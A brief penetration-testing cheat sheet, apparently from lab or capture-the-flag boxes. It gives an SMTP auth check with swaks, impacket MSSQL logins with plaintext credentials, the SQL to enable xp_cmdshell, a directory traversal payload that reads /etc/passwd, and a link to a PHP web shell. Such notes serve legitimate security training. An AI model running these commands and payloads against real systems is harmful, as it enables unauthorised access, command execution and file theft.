## Email Attack

- swaks -server mailing.htb --auth LOGIN --auth-user administrator@mailing.htb --auth-password homenetworkingadministrator --quit-after AUTH

## MSSQL Enabling xp_cmdshell

- impacket-mssqlclient sql_svc:Dolphin1@10.10.205.148 -windows-auth
- impacket-mssqlclient -k -no-pass SSCM.LAB/sccm-sql@mssql.sccm.lab -debug
- EXECUTE sp_configure 'show advanced options', 1;
- RECONFIGURE;
- EXECUTE sp_configure 'xp_cmdshell', 1;
- RECONFIGURE;

## Directory Traversal

- ....//....//....//....//....//....//....//....//....//....//....//etc/passwd

## PHP webshell

- https://github.com/artyuum/simple-php-web-shell.git
